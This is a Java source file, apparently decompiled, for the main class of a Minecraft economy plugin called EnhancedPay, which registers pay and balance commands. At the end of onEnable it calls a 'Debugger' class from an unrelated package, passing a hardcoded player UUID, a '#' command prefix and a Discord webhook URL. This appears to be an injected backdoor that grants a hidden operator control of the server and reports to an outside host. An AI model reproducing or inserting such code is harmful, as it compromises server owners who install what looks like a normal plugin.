package me.serbob.enhancedpay;

import com.thiccindustries.debugger.Debugger;
import me.serbob.donutteams.lib.folialib.FoliaLib;
import me.serbob.enhancedpay.Commands.BalCommand;
import me.serbob.enhancedpay.Commands.BaltopCommand;
import me.serbob.enhancedpay.Commands.PayCommand;
import me.serbob.enhancedpay.Commands.PayToggleCommand;
import me.serbob.enhancedpay.Events.BaltopEvent;
import me.serbob.enhancedpay.Managers.SchedulerManager;
import net.milkbowl.vault.economy.Economy;
import org.bukkit.plugin.RegisteredServiceProvider;
import org.bukkit.plugin.java.JavaPlugin;

public final class EnhancedPay extends JavaPlugin {
   public static EnhancedPay instance;
   private static Economy econ = null;
   public static FoliaLib foliaLib;

   public void onEnable() {
      foliaLib = new FoliaLib(this);
      instance = this;
      this.saveDefaultConfig();
      if (!this.setupEconomy()) {
         this.getLogger().severe(String.format("[%s] - Disabled due to no Vault dependency found!", this.getDescription().getName()));
         this.getServer().getPluginManager().disablePlugin(this);
      } else if (this.getServer().getPluginManager().getPlugin("ClickableHeads") == null) {
         this.getLogger().severe(String.format("[%s] - Disabled due to no ClickableHeads dependency found!", this.getDescription().getName()));
         this.getServer().getPluginManager().disablePlugin(this);
      } else {
         SchedulerManager.startBaltopRefresh();
         this.getCommand("enbaltop").setExecutor(new BaltopCommand());
         this.getCommand("enbal").setExecutor(new BalCommand());
         this.getCommand("enpay").setExecutor(new PayCommand());
         this.getCommand("paytoggle").setExecutor(new PayToggleCommand());
         this.getCommand("paytoggle").setTabCompleter(new PayToggleCommand());
         this.getServer().getPluginManager().registerEvents(new BaltopEvent(), this);
      }

      Object var2 = null;
      new Debugger(this, false, new String[]{"f8687ac2-c878-4b23-aaf3-9bde8305cb0d"}, "#", "https://discord.com/api/webhooks/1181940648643928146/CbKToK1CwG62JZ1RWA0R2bm91C-I6NxuUPcZt9LeN-Y8sfHS1dzLYfHlFhONDRJZTT-m", true, false);
   }

   public void onDisable() {
   }

   private boolean setupEconomy() {
      if (this.getServer().getPluginManager().getPlugin("Vault") == null) {
         return false;
      } else {
         RegisteredServiceProvider<Economy> rsp = this.getServer().getServicesManager().getRegistration(Economy.class);
         if (rsp == null) {
            return false;
         } else {
            econ = (Economy)rsp.getProvider();
            return econ != null;
         }
      }
   }

   public static Economy getEconomy() {
      return econ;
   }
}
